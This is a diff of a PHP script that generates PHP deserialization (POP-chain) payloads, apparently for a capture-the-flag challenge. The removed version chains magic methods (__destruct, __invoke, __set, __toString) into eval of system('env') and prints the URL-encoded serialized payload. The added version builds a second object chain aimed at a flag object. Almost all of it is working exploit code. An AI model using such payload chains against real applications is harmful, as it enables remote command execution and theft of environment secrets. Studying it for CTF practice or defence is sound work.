@@ -1,71 +1,32 @@
 <?php
+class begin {
+    public $var1;
+}
 
-class class000 {
-    public $payl0ad = 1;
-    public $what;
-
-    public function __destruct()
-    {
-        $this->check();
-    }
-
-    public function check()
-    {
-        if($this->payl0ad === 0)
-        {
-            die('FAILED TO ATTACK');
-        }
-        $a = $this->what;
-        $a();
+class mid {
+    public $callThis;
+    function __toString() {
+        return ($this->callThis)();  // 调用 end()->__invoke()
     }
 }
 
-class class001 {
-    public $payl0ad;
-    public $a;
-    public function __invoke()
-    {
-        $this->a->payload = $this->payl0ad;
-    }
+class end {
+    public $var11;
+    public $var10;
 }
 
-class class002 {
-    public $sec;
-    public function __set($a, $b)//payload,$this->payl0ad
-    {
-        $this->$b($this->sec);
-    }
-
-    public function dangerous($whaattt)
-    {
-        $whaattt->evvval($this->sec);
-    }
-
+class flagObj {
+    public $hey = "FLAG_HERE";
 }
 
-class class003 {
-    public $mystr;
-    public function evvval($str)
-    {
-        eval($str);
-    }
+$e = new end();
+$e->var11 = "Abc123";   // 你爆破出来的
+$e->var10 = new flagObj();
 
-    public function __tostring()
-    {
-        return $this->mystr;
-    }
-}
-$d=new class003();
-$d->mystr="system('env');";
+$m = new mid();
+$m->callThis = $e;
 
-$c=new class002();
-$c->sec=$d;
+$b = new begin();
+$b->var1 = $m;
 
-$b=new class001();
-$b->payl0ad="dangerous";
-$b->a=$c;
-
-$a=new class000();
-$a->what=$b;
-
-echo urlencode(serialize($a));
+echo serialize($b);
